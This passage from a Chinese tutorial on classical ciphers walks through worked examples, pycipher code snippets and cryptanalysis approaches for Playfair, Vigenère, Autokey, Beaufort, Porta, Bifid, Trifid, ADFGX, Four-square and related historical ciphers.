alt="夏多密码.png"></p><blockquote><p>注意，在以上所示的字母表密钥的底部，列有四个附加符号1，2，3，4.他们可以放在密文中的任何地方。每个附加符号指示，如何转动写有密文的纸张，再进行后续的加密或解密操作，直到出现另一个附加符号。可以把每个附加符号中的那根线看作是指示针，它指示了纸张的上端朝上，朝右，朝下，朝左。比如说：如果出现符号3，那么纸张就应该转动180度，使其上端朝下；<br>符号2表示纸张上端朝右，依次类推。</p></blockquote><p>源文本：<code>I AM IN DANGER SEND HELP(我有危险，速来增援)</code></p><p>密文：</p><p><img src="http://img0.tuicool.com/nIJVneU.jpg" alt="夏多密码示例.jpg"></p><hr><h4 id="9-普莱菲尔密码"><a href="#9-普莱菲尔密码" class="headerlink" title="9.普莱菲尔密码"></a>9.普莱菲尔密码</h4><p>普莱菲尔密码(Playfair Cipher)是第一种用于实际的双字替换密码，用双字加密取代了简单代换密码的单字加密，很明显这样使得密文更难破译，因为使用简单替换密码的频率分析基本没有什么作用，虽然频率分析，通常仍然可以进行，但是有25×25=625种可能而不是25种可能，可以分为三个步骤，即编制密码表、整理明文、编写译文，下面我们以明文：<br><code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code>和密钥<code>CULTURE</code>为例来讲解。普莱菲尔密码又称为单方密码(Single Cipher)之后又出现它的升级版Double Playfair，也就是<a href="https://en.wikipedia.org/wiki/Two-square_cipher" target="_blank" rel="external">二方密码</a>(Two-square Cipher),在之后又有四方密码(Four-square Cipher)</p><p><strong>(1)编制密码表</strong></p><p>1.整理密钥字母<code>C U L T U R E</code>，去掉后面重复的字母得到：<code>C U L T R E</code></p><p>2.用上一步得到的字母自上而下来填补5乘5方表的纵列（也可横排），之后的空白按照相同的顺序用字母表中剩余的字母依次填补完整，得到如下的方格:</p><p><img src="http://img0.tuicool.com/7jQJVne.png" alt="普莱菲尔密码.png"></p><blockquote><p>这一步需要注意的要点：整理密钥字母时，如果出现”Z”，则需要去除，因为在英文里”Z”的使用频率最低，相应的如果是德文，则需将”I”与”J”当作一个字母来看待，而法语则去掉”W”或”K”。</p></blockquote><p><strong>(2)整理明文</strong></p><p>我们要遵循的原则是“两个一组”，得到是若干个两两成对的字母段，用到的是明文<code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code>与字母”<code>X</code>“：</p><p>1.将明文两两一组按顺序排开，得到：<code>TH EQ UI CK BR OW NF OX JU MP SO VE RT HE LA ZY DO G</code></p><p>2.对于末尾的单个字母要加上一个”<code>X</code>“使之成对：<code>TH EQ UI CK BR OW NF OX JU MP SO VE RT HE LA ZY DO GX</code></p><blockquote><p>这一步需要注意的要点：对于相连字母相同者，每个后面都需要加”<code>X</code>“，例如<code>TOMORROW</code>，需要写成：<code>TO MO RX RX OW</code>。</p></blockquote><p><strong>(3)编写密文</strong></p><p>我们要得到的密文，当然，对于每个字母对，要严格遵循如下的原则：</p><blockquote><p>1.如果两个字母在同一行则要用它右邻的字母替换，如果已在最右边，则用该行最左边的替换，如明文为”<code>CE</code>“，依据上表，应替换为”<code>EG</code>“；</p><p>2.如果两个字母在同一列则要用它下边的字母替换，如果已在最下边，则用该行最上边的替换，如明文为”<code>OQ</code>“，依据上表，应替换为”<code>PS</code>“；</p><p>3.如果两个字母在不同的行或列，则应在密码表中找两个字母使四个字母组成一个矩形，明文占据两个顶点，需用另外两个顶点的字母替换，如明文为”<code>HX</code>“，可以替换为”<code>WI/J</code>“或”<code>I/JW</code>“（下面的例子将按照横向替换原则即同行优先）。</p></blockquote><p>按照上述原则，将明文<code>TH EQ UI CK BR OW NF OX JU MP SO VE RT HE LA ZY DO GX</code>加以转换得到<code>KU ND LH GT LF WU ES PW LH SI/J NP CG CR AG BU VZ QA I/JV</code>（/表示或者，不过一般用I不用J，所以分析密文时你看25个字母都有而只差一个字母没有用到可以考虑一下这种加密方式）将得到的字母改为大写并五个一组列好，得到密文<code>KUNDL HGTLF WUESP WLHSI NPCGC RAGBU VZQAI V</code>。</p><p>加密解密<a href="http://www.practicalcryptography.com/ciphers/classical-era/playfair/" target="_blank" rel="external">传送门</a>(ps：这里加解密是横向编制密码表)</p><p>加密解密实例(ps：这里加解密也是横向编制密码表)：</p><pre><code>&gt;&gt;&gt;from pycipher import Playfair&gt;&gt;&gt;Playfair(&apos;CULTREABDFGHIKMNOPQSVWXYZ&apos;).encipher(&apos;THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG&apos;)&apos;UKDNLHTGFLWUSEPWHLISNPCGCRGAUBVZAQIV&apos;&gt;&gt;&gt;Playfair(&apos;CULTREABDFGHIKMNOPQSVWXYZ&apos;).decipher(&apos;UKDNLHTGFLWUSEPWHLISNPCGCRGAUBVZAQIV&apos;)&apos;THEQUICKBROWNFOXIUMPSOVERTHELAZYDOGX&apos;</code></pre><hr><h4 id="10-维吉尼亚密码"><a href="#10-维吉尼亚密码" class="headerlink" title="10.维吉尼亚密码"></a>10.维吉尼亚密码</h4><p><strong>（1）介绍</strong></p><p>维吉尼亚密码(Vigenère Cipher)是在单一恺撒密码的基础上扩展出多表代换密码，根据密钥(当密钥长度小于明文长度时可以循环使用)来决定用哪一行的密表来进行替换，以此来对抗字频统计，更多<a href="https://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher" target="_blank" rel="external">参考</a>。</p><p>密表：</p><p><img src="http://img0.tuicool.com/rUV7rqB.png" alt="维吉尼亚密码.png"></p><p>明文：<code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code></p><p>密钥(循环使用，密钥越长相对破解难度越大)：<code>CULTURE</code></p><p>加密过程：如果第一行为明文字母，第一列为密钥字母，那么明文字母’T’列和密钥字母’C’行的交点就是密文字母’V’，以此类推。</p><p>密文：<code>VBP JOZGM VCHQE JQR UNGGW QPPK NYI NUKR XFK</code></p><p><strong>（2）已知密钥加解密</strong></p><pre><code>&gt;&gt;&gt;from pycipher import Vigenere&gt;&gt;&gt;Vigenere(&apos;CULTURE&apos;).encipher(&apos;THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG&apos;)&apos;VBPJOZGMVCHQEJQRUNGGWQPPKNYINUKRXFK&apos;&gt;&gt;&gt;Vigenere(&apos;CULTURE&apos;).decipher(&apos;VBPJOZGMVCHQEJQRUNGGWQPPKNYINUKRXFK&apos;)&apos;THEQUICKBROWNFOXJUMPSOVERTHELAZYDOG&apos;</code></pre><p>在线加密解密<a href="http://planetcalc.com/2468/" target="_blank" rel="external">传送门</a></p><p><strong>（3）未知密钥破解</strong></p><p>可以参考<a href="http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-vigenere-cipher/" target="_blank" rel="external">维吉尼亚密码分析</a>这篇文章，破解维吉尼亚密码第一步是确定密钥长度，维吉尼亚密码分析这篇文章里介绍了使用<a href="https://en.wikipedia.org/wiki/Index_of_coincidence" target="_blank" rel="external">重合指数</a>算法来确定密钥长度，在确定密钥长度后就可以尝试确定密钥，通常我们可以使用<a href="https://en.wikipedia.org/wiki/Chi-squared_test" target="_blank" rel="external">卡方检验</a>来找到每个字母的偏移量，基于维吉尼亚密码分析一文中的算法实现的工具破解示例。</p><p>密文：<code>kiqpbkxspshwehospzqhoinlgapp</code></p><p>解密：</p><p><img src="http://img2.tuicool.com/bEvaeaj.png" alt="维吉尼亚密码破解.png"><br>(ps:结合左边的值，密钥以及解出明文可以确定kien 5或者klen 10为准确的结果)</p><p>明文：<code>DEFEND THE EAST WALL OF THE CASTLE</code></p><p><strong>（4）变种</strong></p><p>有几种密码和维吉尼亚密码相似，格罗斯费尔德密码(Gronsfeld cipher)实际上和维吉尼亚密码相同，除了使用了数字来代替字母以外没有什么区别。数字可以选择一种数列，如斐波那契数列，或者一些其他的伪随机序列。格罗斯费尔德密码密码分析过程和维吉尼亚密码大同小异，不过，自动密钥密码不能使用<a href="http://www.zybang.com/question/a0a1108423f63d10dbbf0c3e1bfdf3b3.html" target="_blank" rel="external">卡西斯基算法</a>(kasiski)来破译，因为自动密钥密码的密钥不重复循环使用，破译自动密钥密码最好的方法的就是从密文不断尝试和猜测其中明文或密钥的一部分。</p><p><img src="http://img2.tuicool.com/iqueIze.png" alt="格罗斯费尔德密码.png"></p><pre><code>&gt;&gt;&gt;from pycipher import Gronsfeld&gt;&gt;&gt;Gronsfeld([2,20,11,45,20,43,4]).encipher(&apos;THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG&apos;)&apos;VBPJOZGMVCHQEJQRUNGGWQPPKNYINUKRXFK&apos;&gt;&gt;&gt;Gronsfeld([2,20,11,45,20,43,4]).decipher(&apos;VBPJOZGMVCHQEJQRUNGGWQPPKNYINUKRXFK&apos;)&apos;THEQUICKBROWNFOXJUMPSOVERTHELAZYDOG&apos;</code></pre><p>在线加解密<a href="http://rumkin.com/tools/cipher/gronsfeld.php" target="_blank" rel="external">传送门</a></p><hr><h4 id="11-自动密钥密码"><a href="#11-自动密钥密码" class="headerlink" title="11.自动密钥密码"></a>11.自动密钥密码</h4><p><strong>（1）介绍</strong></p><p>自动密钥密码(Autokey Cipher)是多表替换密码，与维吉尼亚密码密切相关，但使用不同的方法生成密钥，通常来说要比维吉尼亚密码更安全。自动密钥密码主要有两种，关键词自动密钥密码和原文自动密钥密码.下面我们以关键词自动密钥为例：</p><p>明文：<code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code></p><p>关键词：<code>CULTURE</code></p><p>自动生成密钥：<code>CULTURE THE QUICK BROWN FOX JUMPS OVER THE</code></p><p>接下来的加密过程和维吉尼亚密码类似，从密表可得：</p><p>密文：<code>VBP JOZGD IVEQV HYY AIICX CSNL FWW ZVDP WVK</code></p><p><strong>（2）已知关键词加解密</strong></p><pre><code>&gt;&gt;&gt;from pycipher import Autokey&gt;&gt;&gt;Autokey(&apos;CULTURE&apos;).encipher(&apos;THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG&apos;)&apos;VBPJOZGDIVEQVHYYAIICXCSNLFWWZVDPWVK&apos;&gt;&gt;&gt;Autokey(&apos;CULTURE&apos;).decipher(&apos;VBPJOZGDIVEQVHYYAIICXCSNLFWWZVDPWVK&apos;)&apos;THEQUICKBROWNFOXJUMPSOVERTHELAZYDOG&apos;</code></pre><p>在线加解密<a href="http://www.practicalcryptography.com/ciphers/classical-era/autokey/" target="_blank" rel="external">传送门</a></p><p><strong>（3）未知关键词破解</strong></p><p>推荐去看这篇<a href="http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-autokey-cipher/" target="_blank" rel="external">自动密钥密码分析文章</a>，基于文中的算法实现的工具来破解示例。</p><p>密文:</p><pre><code>isjiqymdebvuzrvwhmvysibugzhyinmiyeiklcvioimbninyksmmnjmgalvimlhspjxmgfiraqlhjcpvolqmnyynhpdetoxemgnoxl</code></pre><p>解密</p><p><img src="http://img1.tuicool.com/ANJ7buY.png" alt="自动密钥密码破解.png"><br>(ps:从klen 13可以看出使用的关键词为’FORTIFICATION’)</p><p>明文：</p><pre><code>DESPITEBEINGMORESECURETHANTHEVIGENERECIPHERTHEAUTOKEYCIPHERISSTILLVERYEASYTOBREAKUSINGAUTOMATEDMETHODS</code></pre><p>将明文转换成可读句子：</p><p>despite being more secure than the vigenere cipher the autokey cipher is still very easy to break using automated methods</p><hr><h4 id="12-博福特密码"><a href="#12-博福特密码" class="headerlink" title="12.博福特密码"></a>12.博福特密码</h4><p><strong>（1）介绍</strong></p><p>博福特密码(Beaufort Cipher)，是一种类似于维吉尼亚密码的代换密码，由弗朗西斯·蒲福(Francis Beaufort)发明。它最知名的应用是Hagelin M-209密码机。博福特密码属于对等加密，即加密演算法与解密演算法相同。</p><p>明文：<code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code></p><p>密钥(循环使用，密钥越长相对破解难度越大)：<code>CULTURE</code></p><p>加密过程：如果第一行为明文字母，第一列为密文字母，那么沿明文字母’T’列出现密钥字母’C’的行号就是密文字母’J’，以此类推。</p><p>密文：<code>JNH DAJCS TUFYE ZOX CZICM OZHC BKA RUMV RDY</code></p><p><strong>（2）已知密钥加解密</strong></p><pre><code>&gt;&gt;&gt;from pycipher import Beaufort&gt;&gt;&gt;Beaufort(&apos;CULTURE&apos;).encipher(&apos;THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG&apos;)&apos;JNHDAJCSTUFYEZOXCZICMOZHCBKARUMVRDY&apos;&gt;&gt;&gt;Beaufort(&apos;CULTURE&apos;).decipher(&apos;JNHDAJCSTUFYEZOXCZICMOZHCBKARUMVRDY&apos;)&apos;THEQUICKBROWNFOXJUMPSOVERTHELAZYDOG&apos;</code></pre><p>在线加解密<a href="http://www.practicalcryptography.com/ciphers/classical-era/beaufort/" target="_blank" rel="external">传送门</a></p><hr><h4 id="13-滚动密钥密码"><a href="#13-滚动密钥密码" class="headerlink" title="13.滚动密钥密码"></a>13.滚动密钥密码</h4><p><strong>（1）介绍</strong></p><p>滚动密钥密码(Running Key Cipher)和维吉尼亚密码有着相同的加密机制，区别是密钥的选取，维吉尼亚使用的密钥简短，而且重复循环使用，与之相反，滚动密钥密码使用很长的密钥，比如引用一本书作为密钥。这样做的目的是不重复循环使用密钥，使密文更难破译，尽管如此，滚动密钥密码还是可以被攻破，因为有关于密钥和明文的统计分析模式可供利用，如果滚动密钥密码使用统计上的随机密钥来源，那么理论上是不可破译的，因为任何可能都可以成为密钥，并且所有的可能性都是相等的。</p><p>明文：<code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code></p><p>密钥：选取C语言编程(1978版)第63页第1行”errors can occur in several places. A label has…”，去掉非字母部分作为密钥(实际选取的密钥很长，长度至少不小于明文长度)。</p><p>加密过程：加密过程和维吉尼亚密码加密过程相同</p><p>密文:<code>XYV ELAEK OFQYH WWK BYHTJ OGTC TJI DAK YESR</code></p><p>已知密钥在线加解密<a href="http://www.practicalcryptography.com/ciphers/classical-era/running-key/" target="_blank" rel="external">传送门</a></p><hr><h4 id="14-Porta密码"><a href="#14-Porta密码" class="headerlink" title="14.Porta密码"></a>14.Porta密码</h4><p><strong>（1）介绍</strong></p><p>Porta密码(Porta Cipher)是一个由意大利那不勒斯的医生Giovanni Battista della Porta发明的多表代换密码，Porta密码具有加密解密过程的是相同的特点。</p><p>密表：</p><pre><code>KEYS| A B C D E F G H I J K L M N O P Q R S T U V W X Y Z----|----------------------------------------------------A,B | N O P Q R S T U V W X Y Z A B C D E F G H I J K L MC,D | O P Q R S T U V W X Y Z N M A B C D E F G H I J K LE,F | P Q R S T U V W X Y Z N O L M A B C D E F G H I J KG,H | Q R S T U V W X Y Z N O P K L M A B C D E F G H I JI,J | R S T U V W X Y Z N O P Q J K L M A B C D E F G H IK,L | S T U V W X Y Z N O P Q R I J K L M A B C D E F G HM,N | T U V W X Y Z N O P Q R S H I J K L M A B C D E F GO,P | U V W X Y Z N O P Q R S T G H I J K L M A B C D E FQ,R | V W X Y Z N O P Q R S T U F G H I J K L M A B C D ES,T | W X Y Z N O P Q R S T U V E F G H I J K L M A B C DU,V | X Y Z N O P Q R S T U V W D E F G H I J K L M A B CW,X | Y Z N O P Q R S T U V W X C D E F G H I J K L M A BY,Z | Z N O P Q R S T U V W X Y B C D E F G H I J K L M A</code></pre><p>明文：<code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code></p><p>密钥(循环使用，密钥越长相对破解难度越大)：<code>CULTURE</code></p><p>加密过程：明文字母’T’列与密钥字母’C’行交点就是密文字母’F’,以此类推。</p><p>密文：<code>FRW HKQRY YMFMF UAA OLWHD ALWI JPT ZXHC NGV</code></p><p>已知密钥在线加解密<a href="http://www.practicalcryptography.com/ciphers/classical-era/porta/" target="_blank" rel="external">传送门</a></p><p><strong>（2）破解</strong></p><p>Porta密码可以被以<a href="http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-vigenere-cipher-part-2/" target="_blank" rel="external">维吉尼亚密码</a>破解相类似方式进行自动攻破，破解Porta密码第一步是先确定密钥长度，这里推荐一篇关于使用<a href="https://en.wikipedia.org/wiki/Index_of_coincidence" target="_blank" rel="external">重合指数算法</a>确定为维吉尼亚密钥长度<a href="http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-vigenere-cipher/" target="_blank" rel="external">文章</a>。</p><hr><h4 id="15-同音替换密码"><a href="#15-同音替换密码" class="headerlink" title="15.同音替换密码"></a>15.同音替换密码</h4><p><strong>（1）介绍</strong></p><p>同音替换密码(Homophonic Substitution Cipher)是单字母可以被其他几种密文字母同时替换的密码，通常要比标准替换密码破解更加困难，破解标准替换密码最简单的方法就是分析字母出现频率，通常在英语中字母’E’(或’T’)出现的频率是最高的，如果我们允许字母’E’可以同时被3种不同字符代替，那么就不能还是以普通字母的频率来分析破解，如果允许可代替字符越多，那么密文就会更难破译。</p><p>常见代换规则表：</p><p><img src="http://img1.tuicool.com/Uniaean.png" alt="同音替换密码.png"></p><p>明文:<code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code></p><p>密文(其中一种)：<code>6CZ KOVST XJ0MA EQY IOGL4 0W1J UC7 P9NB F0H</code></p><p><strong>（2）破解</strong></p><p>如果同音替换密码的同音词个数很多，那么破解它难度很大，通常的方法采取类似破解替换密码的”爬山算法”，除了找到一个明文字母映射几个字符之外，我们还需要确定映射了那些字符，可以尝试<a href="http://www.cs.sjsu.edu/faculty/stamp/RUA/homophonic.pdf" target="_blank" rel="external">2层嵌套”爬山算法”</a>来破解，外层确定映射的数量，内层确定映射字符。</p><hr><h4 id="16-仿射密码"><a href="#16-仿射密码" class="headerlink" title="16.仿射密码"></a>16.仿射密码</h4><p><strong>（1）介绍</strong></p><p>仿射密码(Affine Cipher)是一种单表代换密码，字母表中的每个字母相应的值使用一个简单的数学函数映射到对应的数值，再把对应数值转换成字母。这个公式意味着每个字母加密都会返回一个相同的字母，意义着这种加密方式本质上是一种标准替代密码。因此，它具有所有替代密码的弱点。每一个字母都是通过函数（ax + b）mod m加密，其中B是位移量，为了保证仿射密码的可逆性，a和m需要满足gcd(a , m)=1，一般m为设置为26。更多<a href="https://en.wikipedia.org/wiki/Affine_cipher" target="_blank" rel="external">参考</a></p><p>常见的字母对应关系：</p><p><img src="http://img0.tuicool.com/UriIrq7.png" alt="常见的字母对应关系.png"></p><p>下面我们以E(x) = (5x + 8) mod 26函数为例子</p><p><img src="http://img1.tuicool.com/73mmmiq.png" alt="仿射密码.png"></p><p>至于解密我们知道</p><p><img src="http://img1.tuicool.com/fMBVze6.png" alt="仿射密码解密1.png"></p><p><img src="http://img1.tuicool.com/byYzUj2.png" alt="仿射密码解密2.png"></p><p>即可得出解密结果</p><p><img src="https://www.hackfun.org/usr/uploads/2016/07/2787731818.png" alt="仿射密码解密结果.png"></p><p>以E(x) = (5x + 8) mod 26加密，通过计算可得D(x)=21(x - 8) mod 26，这样便可以得到明文。</p><p>可参考的Python脚本</p><p><img src="http://img1.tuicool.com/J3uY32a.png" alt="仿射密码解密脚本.png"></p><p>加解密<a href="http://www.practicalcryptography.com/ciphers/classical-era/affine/" target="_blank" rel="external">传送门</a></p><hr><h4 id="17-培根密码"><a href="#17-培根密码" class="headerlink" title="17.培根密码"></a>17.培根密码</h4><p><strong>（1）介绍</strong></p><p>培根密码(Baconian Cipher)是一种替换密码，每个明文字母被一个由5字符组成的序列替换，最初的加密方式就是由’A’和’B’组成序列替换明文(所以你当然也可以用别的字母)，比如字母’D’替换成”aaabb”，以下是全部的对应关系(另一种对于关系是每个字母都有唯一对应序列，I和J与U/V各自都有不同对应序列)：</p><pre><code>A = aaaaa  I/J = abaaa  R = baaaaB = aaaab  K = abaab    S = baaabC = aaaba  L = ababa    T = baabaD = aaabb  M = ababb    U/V = baabbE = aabaa  N = abbaa    W = babaaF = aabab  O = abbab    X = bababG = aabba  P = abbba    Y = babbaH = aabbb  Q = abbbb    Z = babbb</code></pre><p>明文：<code>T H E F O X</code></p><p>密文：<code>baaba aabbb aabaa aabab abbab babab</code></p><p>加解密<a href="http://rumkin.com/tools/cipher/baconian.php" target="_blank" rel="external">传送门</a></p><hr><h4 id="18-ADFGX和ADFGVX密码"><a href="#18-ADFGX和ADFGVX密码" class="headerlink" title="18.ADFGX和ADFGVX密码"></a>18.ADFGX和ADFGVX密码</h4><p><strong>（1）ADFGX密码</strong></p><p>ADFGX密码(ADFGX Cipher)是结合了改良过的Polybius方格替代密码与单行换位密码的矩阵加密密码，使用了5个合理的密文字母：A，D，F，G，X，这些字母之所以这样选择是因为当转译成摩尔斯电码(ADFGX密码是德国军队在一战发明使用的密码)不易混淆，目的是尽可能减少转译过程的操作错误。</p><p>加密矩阵示例：</p><pre><code>    A  D  F  G   X  ----------------A | p  h  q  g   m D | e  a  y  n   o F | f  d  x  k   rG | c  v  s  z   w X | b  u  t  i/j l</code></pre><p>明文：<code>THE QUICK BROWN FOX</code></p><p>结果矩阵加密：</p><pre><code>XF AD DA   AF XD XG GA FG   XA FX DX GX DG   FA DX FF </code></pre><p>列移位密钥：<code>how are u</code></p><p><img src="http://img0.tuicool.com/bqArYz6.png" alt="ADFGX密码.png"></p><p>密文：<code>DXADF AGXF XFFXD FXGGX DGFG AADA ADXXF</code></p><p>已知密钥加解密：</p><pre><code>&gt;&gt;&gt;from pycipher import ADFGX&gt;&gt;&gt;a = ADFGX(&apos;phqgmeaynofdxkrcvszwbutil&apos;,&apos;HOWAREU&apos;)&gt;&gt;&gt;a.encipher(&apos;THE QUICK BROWN FOX&apos;)&apos;DXADFAGXFXFFXDFXGGXDGFGAADAADXXF&apos;&gt;&gt;&gt;a.decipher(&apos;DXADFAGXFXFFXDFXGGXDGFGAADAADXXF&apos;)&apos;THEQUICKBROWNFOX&apos;</code></pre><p>在线加解密<a href="http://www.practicalcryptography.com/ciphers/adfgx-cipher/" target="_blank" rel="external">传送门</a></p><p><strong>（2）ADFGVX密码</strong></p><p>ADFGVX密码实际上就是ADFGX密码的扩充升级版，一样具有ADFGX密码相同的特点，加密过程也类似，不同的是密文字母增加了V，使得可以再使用10数字来替换明文。</p><pre><code>    A D F G V X  -------------A | p h 0 q g 6D | 4 m e a 1 yF | l 2 n o f dG | x k r 3 c vV | s 5 z w 7 bX | j 9 u t i 8</code></pre><p>由于两种加密过程完全类似这里就不再重复给出加密过程。</p><pre><code>&gt;&gt;&gt;from pycipher import ADFGVX&gt;&gt;&gt;a = ADFGVX(&apos;ph0qg64mea1yl2nofdxkr3cvs5zw7bj9uti8&apos;,&apos;HOWAREU&apos;)&gt;&gt;&gt;a.encipher(&apos;THE QUICK BROWN FOX&apos;)&apos;DXXFAFGFFXGGGFGXDVGDVGFAVFVAFVGG&apos;&gt;&gt;&gt;a.decipher(&apos;DXXFAFGFFXGGGFGXDVGDVGFAVFVAFVGG&apos;)&apos;THEQUICKBROWNFOX&apos;</code></pre><hr><h4 id="19-双密码"><a href="#19-双密码" class="headerlink" title="19.双密码"></a>19.双密码</h4><p><strong>（1）双密码</strong></p><p>双密码(Bifid Cipher)结合了波利比奥斯方阵换位密码，并采用分级实现扩散，这里的“双”是指用2个密钥进行加密。双密码是由法国Felix Delastelle发明，除此之外Felix Delastelle还发明了三分密码(Trifid Cipher)，四方密码(Four-Square Cipher)。还有一个<a href="https://en.wikipedia.org/wiki/Two-square_cipher" target="_blank" rel="external">两方密码</a>(Two-Square)与四方密码类似，<a href="http://www.thonky.com/kryptos/cm-bifid-cipher" target="_blank" rel="external">共轭矩阵双密码</a>(Conjugated Matrix Bifid Cipher)也是双密码的变种。</p><p>示例密阵:</p><pre><code>   1 2 3 4 51| p h q g m2| e a y l n3| o f d x k4| r c v s z5| w b u t i/j</code></pre><p>明文:<code>THE QUICK BROWN FOX</code></p><p>经过密阵转换：</p><p>行:<code>512 15543 54352 333</code></p><p>列:<code>421 33525 21115 214</code></p><p>分组:</p><p><code>51215 54354 35233 3</code></p><p><code>42133 52521 11521 4</code></p><p>合并：</p><pre><code>5121542133 5435452521 3523311521 34</code></pre><p>在经过密阵转换后密文:<code>WETED TKZNE KYOME X</code></p><p><strong>（2）已知密阵加解密</strong></p><pre><code>&gt;&gt;&gt;from pycipher import&gt;&gt;&gt;Bifid(&apos;phqgmeaylnofdxkrcvszwbuti&apos;,5).encipher(&apos;THE QUICK BROWN FOX&apos;)&apos;WETEDTKZNEKYOMEX&apos;&gt;&gt;&gt;Bifid(&apos;phqgmeaylnofdxkrcvszwbuti&apos;,5).decipher(&apos;WETEDTKZNEKYOMEX&apos;)&apos;THEQUICKBROWNFOX&apos;</code></pre><p>在线加解密<a href="http://www.practicalcryptography.com/ciphers/classical-era/bifid/" target="_blank" rel="external">传送门</a></p><p><strong>（3）未知密阵破解</strong></p><p>手工分析破解双密码是有一定难度的，每个字母都是同过3个数字进行非线性代替转换，而且之后还会对字母顺序进行打乱，这样使双密码比一些替换密码和换位密码更难破解。然而，现在是计算机时代，这张加密方式没有安全性可言，通过<a href="http://baike.baidu.com/link?url=mkceUr0W4L7B7UVQxc-dUkXKPJbj9v4YyBh_hrskt5iXk99UdnjW6mZ_YxoJO1PkT1zdjEZD2hd7TCMiSxpOma" target="_blank" rel="external">模拟退火</a>算法就能快速找到双密码的密阵。<br>这里推荐一篇详细的<a href="http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-bifid-cipher/" target="_blank" rel="external">双密码破解分析</a>的文章，基于模拟退火算法实现的工具破解示例：</p><p>密文:</p><pre><code>KWTAZQLAWWZCPONIVBTTBVQUZUGRNHAYIYGIAAYURCUQLDFTYVHTNQEENUPAIFCUNQTNGITEFUSHFDWHRIFSVTBISYDHHASQSROMUEVPQHHCCRBYTQBHWYRRHTEPEKHOBFSZUQBTSYRSQUDCSAOVUUGXOAUYWHPGAYHDNKEZPFKKWRIEHDWPEIOTBKESYETPBPOGTHQSPUMDOVUEQAUPCPFCQHRPHSOPQRSSLPEVWNIQDIOTSQESDHURIEREN</code></pre><p>解密：</p><p><img src="http://img0.tuicool.com/NJVB7jY.png" alt="双密码解密.png"></p><p>得到加密矩阵:</p><pre><code>G B C M KD H U E TL V Y W IX O Z S PN F A R Q</code></pre><p>明文:</p><pre><code>CRYPTANALYS IS OF BIFID BY HAND IS ACTUALLY FAIRLY DIFFICULT THE FRACTIONATING NATURE OF THE CIPHER IE EACH LETTER IS SUBSTITUTED BY CHARACTERS THEN THESE CHARACTERS ARE IUM BLED WHICH WILL PULL THEM APART MAKES THE CIPHER MUCH STRONGER THAN SUBSTITUTION CIPHERS OR TRANSPOSITION CIPHER SON THEIR OWN</code></pre><hr><h4 id="20-三分密码"><a href="#20-三分密码" class="headerlink" title="20.三分密码"></a>20.三分密码</h4><p>三分密码(Trifid Cipher)结合换位和替换，三分密码与双密码非常相似，差别之处就是用除了3×3×3的密阵代替5×5密阵。</p><p>示例密阵:</p><pre><code>密阵顺序 = EPSDUCVWYM.ZLKXNBTFGORIJHAQ        方阵 1      方阵 2      方阵 3                                          1 2 3      1 2 3      1 2 3    1 E P S    1 M . Z    1 F G O    2 D U C    2 L K X    2 R I J    3 V W Y    3 N B T    3 H A Q    </code></pre><p>明文:<code>THE QUICK BROWN FOX.</code></p><p>经过密阵转换：</p><pre><code>T H E Q U I C K B R O W N F O X .2 3 1 3 1 3 1 2 2 3 3 1 2 3 3 2 23 3 1 3 2 2 2 2 3 2 1 3 3 1 1 2 13 1 1 3 2 2 3 2 2 1 3 2 1 1 3 3 2</code></pre><p>T(233)表示T在第一个方阵第三行第三列的位置</p><p>分组(分组密钥以5为例):</p><pre><code>THEQU ICKBR OWNFO X.23131 31223 31233 2233132 22232 13311 2131132 23221 32113 32</code></pre><p>合并：</p><pre><code>23131 33132 31132 31223 22232 23221 31233 13311 32113 22 21 32</code></pre><p>在经过密阵转换后密文:</p><pre><code>231313313231132312232223223221312331331132113222132N  O  O  N  W  G  B  X  X  L  G  H  H  W  S  K  W</code></pre><p>想要深入了解三分密码并破解三分密码的小伙伴推荐去看LANIKI教授的一篇密码课程章节的<a href="http://www.und.nodak.edu/org/crypto/crypto/lanaki.crypt.class/lessons/lesson17.zip" target="_blank" rel="external">讲义</a>。</p><hr><h4 id="21-四方密码"><a href="#21-四方密码" class="headerlink" title="21.四方密码"></a>21.四方密码</h4><p><strong>（1）介绍</strong></p><p>四方密码(Four-Square Cipher)是类似普莱菲尔密码双字母加密密码，这样使加密效果强于其他替换密码，因为频率分析变得更加困难了。</p><p>四方密码使用4个预先设置的5×5字母矩阵，每个矩阵包括25个字母，通常字母’j’被融入到’i’中(维基百科上说’q’被忽略，不过这不重要，因为’q’和’j’都是很少出现的字母)，通常左上和右下矩阵式是标准字母排序明文矩阵，右上和左下矩阵是打乱顺序的密钥矩阵。</p><p>示例矩阵：</p><p><img src="http://img0.tuicool.com/aY3aQnI.png" alt="四方密码.png"></p><p>明文：<code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code></p><p>整理明文(分组不够时用’X’填充)：<code>TH EQ UI CK BR OW NF OX JU MP SO VE RT HE LA ZY DO GX</code></p><p>加密过程：分别在明文矩阵中找到’TH’，分别找到他们在右上矩阵有左下矩阵的交点字母’ES’就是密文，以此类推。</p><p>密文：<code>ESZWQAFHGTDKWHRKUENYQOLMQTUNWMBPTGHQ</code></p><p><strong>（2）已知密钥矩阵加解密</strong></p><pre><code>&gt;&gt;&gt;from pycipher import Foursquare&gt;&gt;&gt;fs = Foursquare(&apos;zgptfoihmuwdrcnykeqaxvsbl&apos;,&apos;mfnbdcrhsaxyogvituewlqzkp&apos;)&gt;&gt;&gt;fs.encipher(&apos;THE QUICK BROWN FOX JUMPS OVER THE LAZY 